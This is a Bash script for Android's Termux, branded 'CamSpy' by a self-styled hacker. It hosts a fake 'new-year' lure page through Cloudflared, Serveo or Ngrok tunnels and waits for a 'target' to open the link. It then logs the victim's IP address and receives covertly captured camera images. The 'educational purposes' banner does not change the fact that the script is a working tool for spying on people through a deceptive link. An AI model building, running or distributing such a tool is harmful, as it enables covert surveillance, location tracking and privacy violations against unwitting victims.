#!/bin/bash
# coded by: ATHEX H4CK3R 🔥
clear

# Install dependencies
termux-setup-storage
pkg install php -y
pkg install wget -y
pkg install cloudflared -y  # Added Cloudflared installation
clear

trap 'printf "\n";stop' 2

# Animation functions
animate_banner() {
    echo -e "\033[?25l"  # Hide cursor
    local colors=("\e[1;91m" "\e[1;93m" "\e[1;92m" "\e[1;96m" "\e[1;94m" "\e[1;95m")
    local frame=0
    
    while [ $frame -lt 15 ]; do
        clear
        color=${colors[$((RANDOM % ${#colors[@]}))]}
        
        printf "\n\n"
        printf "    ${color}╔══════════════════════════════════════════════════════════╗\e[0m\n"
        printf "    ${color}║                                                          ║\e[0m\n"
        printf "    ${color}║      ██████╗ █████╗ ███╗   ███╗███████╗██████╗ ██╗   ██╗ ║\e[0m\n"
        printf "    ${color}║     ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝ ║\e[0m\n"
        printf "    ${color}║     ██║     ███████║██╔████╔██║███████╗██████╔╝ ╚████╔╝  ║\e[0m\n"
        printf "    ${color}║     ██║     ██╔══██║██║╚██╔╝██║╚════██║██╔═══╝   ╚██╔╝   ║\e[0m\n"
        printf "    ${color}║     ╚██████╗██║  ██║██║ ╚═╝ ██║███████║██║        ██║    ║\e[0m\n"
        printf "    ${color}║      ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝        ╚═╝    ║\e[0m\n"
        printf "    ${color}║                                                          ║\e[0m\n"
        printf "    ${color}╚══════════════════════════════════════════════════════════╝\e[0m\n"
        
        sleep 0.1
        ((frame++))
    done
    echo -e "\033[?25h"  # Show cursor
}

banner() {
    clear
    printf "\e[0m\n\n"
    
    # Animated gradient banner
    local colors=("\e[1;91m" "\e[1;93m" "\e[1;92m" "\e[1;96m" "\e[1;94m" "\e[1;95m")
    local main_color=${colors[$((RANDOM % ${#colors[@]}))]}
    
    printf "    \e[1;97m┌─────────────────────────────────────────────────────────────┐\e[0m\n"
    printf "    \e[1;97m│                                                             │\e[0m\n"
    
    # Camera logo with animation effect
    printf "    \e[1;97m│    \e[1;96m╔═══════════════════════════════════════════════════╗\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m║    \e[1;95m ██████╗ █████╗ ███╗   ███╗███████╗██████╗ ██╗   ██╗  \e[1;96m║\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m║    \e[1;95m██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝\e[1;96m║\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m║    \e[1;95m██║     ███████║██╔████╔██║███████╗██████╔╝ ╚████╔╝\e[1;96m║\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m║    \e[1;95m██║     ██╔══██║██║╚██╔╝██║╚════██║██╔═══╝   ╚██╔╝\e[1;96m║\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m║    \e[1;95m╚██████╗██║  ██║██║ ╚═╝ ██║███████║██║        ██║     \e[1;96m║\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m║    \e[1;95m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝        ╚═╝   \e[1;96m║\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;96m╚═══════════════════════════════════════════════════╝\e[0m    │\n"
    
    printf "    \e[1;97m│                                                             │\e[0m\n"
    printf "    \e[1;97m├─────────────────────────────────────────────────────────────┤\e[0m\n"
    
    # Animated creator info
    printf "    \e[1;97m│    \e[1;92m✰✰✰ Created By: \e[1;91mA T H E X \e[1;96mH4CK3R \e[1;92m✰✰✰\e[0m     │\n"
    printf "    \e[1;97m│    \e[1;93m↬ Contact: \e[1;97mWhatsApp: \e[1;92m+92 3490916663\e[0m             │\n"
    
    printf "    \e[1;97m├─────────────────────────────────────────────────────────────┤\e[0m\n"
    printf "    \e[1;97m│    \e[1;96m⚠ \e[1;97mPlease use forwarding option if Link not generated\e[0m    │\n"
    printf "    \e[1;97m│    \e[1;93m⚠ \e[1;97mFor Educational Purposes Only!\e[0m                      │\n"
    printf "    \e[1;97m└─────────────────────────────────────────────────────────────┘\e[0m\n"
    
    printf "\n"
}

# Animated loading function
loading() {
    echo -e "\n    \e[1;97m[\e[1;96m•\e[1;97m] \e[1;93m$1 \e[0m"
    local pid=$!
    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
    local charwidth=3
    
    echo -ne "\e[?25l"  # Hide cursor
    
    for i in $(seq 1 10); do
        local color="\e[1;$((90 + (i % 7)))m"
        printf "\r    \e[1;97m[\e[1;96m%s\e[1;97m] \e[1;93m%s \e[0m%s" "${spin:$((i % ${#spin})):1}" "$1" "$(printf '▓%.0s' $(seq 1 $i))"
        sleep 0.1
    done
    
    echo -e "\e[?25h"  # Show cursor
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92m$1 \e[1;92mCompleted!\e[0m\n"
}

stop() {
    printf "\n\n    \e[1;97m[\e[1;91m!\e[1;97m] \e[1;91mStopping all processes...\e[0m\n"
    
    # Animated stopping message
    for i in {1..3}; do
        printf "\r    \e[1;91m⏹  Stopping"
        for j in $(seq 1 $i); do printf "."; done
        for j in $(seq $i 3); do printf " "; done
        printf "\e[0m"
        sleep 0.3
    done
    
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)  # Added Cloudflared check
    
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mNgrok stopped\e[0m\n"
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP server stopped\e[0m\n"
    fi
    
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mSSH stopped\e[0m\n"
    fi
    
    if [[ $checkcloudflared == *'cloudflared'* ]]; then  # Added Cloudflared termination
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
        printf "\r    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared stopped\e[0m\n"
    fi
    
    printf "\n    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mAll processes terminated successfully!\e[0m\n"
    sleep 1
    exit 1
}

dependencies() {
    printf "\n    \e[1;97m[\e[1;96m*\e[1;97m] \e[1;95mChecking dependencies...\e[0m\n"
    
    # Check PHP with animation
    if command -v php > /dev/null 2>&1; then
        printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mPHP \e[1;97mis installed\e[0m\n"
    else
        printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP is not installed!\e[0m\n"
        loading "Installing PHP"
        pkg install php -y > /dev/null 2>&1
    fi
    
    # Check Cloudflared
    if command -v cloudflared > /dev/null 2>&1; then
        printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCloudflared \e[1;97mis installed\e[0m\n"
    else
        printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared is not installed!\e[0m\n"
        loading "Installing Cloudflared"
        pkg install cloudflared -y > /dev/null 2>&1
    fi
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    
    printf "\n    \e[1;97m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "    \e[1;97m║     \e[1;92m🎯 TARGET INFORMATION CAPTURED 🎯\e[1;97m      ║\e[0m\n"
    printf "    \e[1;97m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96mIP Address: \e[1;93m%s\e[1;97m                ║\e[0m\n" "$ip"
    printf "    \e[1;97m║    \e[1;96mTime: \e[1;93m%s\e[1;97m                      ║\e[0m\n" "$(date)"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m╚══════════════════════════════════════════════════╝\e[0m\n"
    
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n    \e[1;97m[\e[1;96m*\e[1;97m] \e[1;95mWaiting for targets...\e[0m\n"
    printf "    \e[1;97m[\e[1;93m!\e[1;97m] \e[1;93mPress \e[1;91mCtrl + C \e[1;93mto exit\e[0m\n\n"
    
    # Animation while waiting
    local anim=0
    local spin='◐◓◑◒'
    
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mTarget opened the link!\e[0m\n"
            echo -e "\a"  # Beep sound
            catch_ip
            rm -rf ip.txt
            
            # Celebration animation
            for i in {1..3}; do
                printf "\r    \e[1;92m🎯 Target Captured! \e[1;93m"
                for j in $(seq 1 $i); do echo -n "✨"; done
                sleep 0.3
            done
            printf "\e[0m\n"
        fi

        if [[ -e "Log.log" ]]; then
            printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mCamera file received!\e[0m\n"
            rm -rf Log.log
        fi
        
        # Spinning animation
        printf "\r    \e[1;97m[\e[1;96m%s\e[1;97m] \e[1;95mWaiting %s\e[0m" "${spin:$((anim % ${#spin})):1}" "$(printf '.%.0s' $(seq 1 $((anim % 4))))"
        ((anim++))
        sleep 0.5
    done
}

server() {
    command -v ssh > /dev/null 2>&1 || { 
        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mSSH not found! Installing...\e[0m\n"
        pkg install openssh -y
    }

    loading "Starting Serveo"
    
    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
        sleep 8
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
        sleep 8
    fi
    
    loading "Starting PHP server"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    
    printf "\n    \e[1;97m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "    \e[1;97m║            \e[1;92m🔗 DIRECT LINK GENERATED 🔗\e[1;97m           ║\e[0m\n"
    printf "    \e[1;97m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96m📎 URL: \e[1;93m%s\e[1;97m  ║\e[0m\n" "$send_link"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m╚══════════════════════════════════════════════════╝\e[0m\n"
}

payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    sed 's+forwarding_link+'$link'+g' new-year.html > index2.html
    sed 's+forwarding_link+'$link'+g' template.php > index.php
}

ngrok_server() {
    loading "Initializing Ngrok"
    
    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { 
            printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mUnzip not found! Installing...\e[0m\n"
            pkg install unzip -y
        }
        
        command -v wget > /dev/null 2>&1 || { 
            printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mWget not found! Installing...\e[0m\n"
            pkg install wget -y
        }
        
        printf "\n    \e[1;97m[\e[1;96m↓\e[1;97m] \e[1;95mDownloading Ngrok...\e[0m\n"
        
        # Progress bar for download
        echo -ne "    \e[1;97m[\e[0m"
        for i in {1..50}; do
            echo -ne "\e[1;92m▓"
            sleep 0.02
        done
        echo -ne "\e[1;97m]\e[0m\n"
        
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            fi
        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            fi
        fi
    fi

    loading "Starting PHP server"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    
    loading "Starting Ngrok tunnel"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    
    printf "\n    \e[1;97m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "    \e[1;97m║           \e[1;92m🌐 NGROK LINK GENERATED 🌐\e[1;97m           ║\e[0m\n"
    printf "    \e[1;97m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96m🔗 URL: \e[1;93m%s\e[1;97m        ║\e[0m\n" "$link"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m╚══════════════════════════════════════════════════╝\e[0m\n"
    
    payload_ngrok
    checkfound
}

# Cloudflared server function (NEW)
cloudflared_server() {
    loading "Initializing Cloudflared"
    
    # Check if cloudflared is installed
    if ! command -v cloudflared > /dev/null 2>&1; then
        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mCloudflared not found! Installing...\e[0m\n"
        loading "Installing Cloudflared"
        pkg install cloudflared -y > /dev/null 2>&1
    fi
    
    loading "Starting PHP server"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    
    loading "Starting Cloudflared tunnel"
    # Kill any existing cloudflared processes
    pkill -f cloudflared > /dev/null 2>&1
    
    # Start cloudflared tunnel
    cloudflared tunnel -url 127.0.0.1:3333 --logfile .cld.log > /dev/null 2>&1 &
    sleep 10
    
    # Get the tunnel URL
    cldflared_link=$(timeout 10 cloudflared tunnel --url 127.0.0.1:3333 2>/dev/null | grep -o 'https://[0-9a-z]*\.trycloudflare.com')
    
    # Alternative method to get URL
    if [ -z "$cldflared_link" ]; then
        cldflared_link=$(timeout 10 curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.trycloudflare\.com")
    fi
    
    if [ -z "$cldflared_link" ]; then
        cldflared_link="https://$(curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4 | grep trycloudflare)"
    fi
    
    printf "\n    \e[1;97m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "    \e[1;97m║        \e[1;92m☁️ CLOUDFLARED LINK GENERATED ☁️\e[1;97m        ║\e[0m\n"
    printf "    \e[1;97m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96m🔗 URL: \e[1;93m%s\e[1;97m        ║\e[0m\n" "$cldflared_link"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m╚══════════════════════════════════════════════════╝\e[0m\n"
    
    # Update payload with cloudflared link
    sed 's+forwarding_link+'$cldflared_link'+g' new-year.html > index2.html
    sed 's+forwarding_link+'$cldflared_link'+g' template.php > index.php
    
    checkfound
}

start1() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    printf "\n    \e[1;97m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "    \e[1;97m║       \e[1;92m🎪 CHOOSE PORT FORWARDING METHOD 🎪\e[1;97m      ║\e[0m\n"
    printf "    \e[1;97m╠══════════════════════════════════════════════════╣\e[0m\n"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96m[01] \e[1;92mCloudflared \e[1;97m(Default & Fast)      ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96m[02] \e[1;92mServeo.net \e[1;97m(Alternative)          ║\e[0m\n"
    printf "    \e[1;97m║    \e[1;96m[03] \e[1;92mNgrok \e[1;97m(Alternative Method)        ║\e[0m\n"
    printf "    \e[1;97m║                                                  ║\e[0m\n"
    printf "    \e[1;97m╚══════════════════════════════════════════════════╝\e[0m\n"
    
    default_option_server="1"
    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;95mChoose option [\e[1;92m1\e[1;95m/\e[1;92m2\e[1;95m/\e[1;92m3\e[1;95m]: \e[0m"
    read -p "" option_server
    option_server="${option_server:-${default_option_server}}"
    
    # Animated selection
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mSelected option: \e[1;96m%s\e[0m\n" "$option_server"
    
    if [[ $option_server -eq 1 ]]; then
        cloudflared_server
    elif [[ $option_server -eq 2 ]]; then
        command -v php > /dev/null 2>&1 || { 
            printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mPHP not found! Installing...\e[0m\n"
            pkg install php -y
        }
        start
    elif [[ $option_server -eq 3 ]]; then
        ngrok_server
    else
        printf "\n    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91mInvalid option! Using default (Cloudflared)\e[0m\n"
        sleep 1
        cloudflared_server
    fi
}

payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed 's+forwarding_link+'$send_link'+g' new-year.html > index2.html
    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}

start() {
    default_choose_sub="Y"
    default_subdomain="camspy$RANDOM"

    printf "\n    \e[1;97m╔══════════════════════════════════════════════════╗\e[0m\n"
    printf "    \e[1;97m║         \e[1;92m🔧 CUSTOM SUBDOMAIN SETUP 🔧\e[1;97m         ║\e[0m\n"
    printf "    \e[1;97m╚══════════════════════════════════════════════════╝\e[0m\n"
    
    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;95mUse custom subdomain? [\e[1;92mY\e[1;95m/\e[1;91mn\e[1;95m]: \e[0m"
    read choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "yes" ]]; then
        subdomain_resp=true
        printf "    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;95mEnter subdomain [\e[1;93m%s\e[1;95m]: \e[0m" "$default_subdomain"
        read subdomain
        subdomain="${subdomain:-${default_subdomain}}"
        
        # Animated subdomain confirmation
        printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mSubdomain set: \e[1;96m%s.serveo.net\e[0m\n" "$subdomain"
    else
        subdomain_resp=false
        printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mUsing random subdomain\e[0m\n"
    fi

    server
    payload
    checkfound
}

# Main execution
animate_banner
banner
dependencies
start1